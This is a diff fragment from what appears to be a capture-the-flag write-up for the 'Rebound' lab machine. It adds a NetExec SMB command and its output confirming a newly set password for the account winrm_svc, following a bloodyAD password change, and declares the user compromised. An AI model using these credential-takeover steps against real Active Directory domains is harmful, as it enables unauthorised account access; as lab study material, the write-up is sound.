@@ -302,6 +302,11 @@ faketime -f +7h bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p 
 The password is now changed ill double check this just to be safe
 
 ```python
-
+nxc smb dc01.rebound.htb -u 'winrm_svc' -p 'Password123!'                                               
+SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\winrm_svc:Password123!
 ```
+This user is now compromised
+
+
 
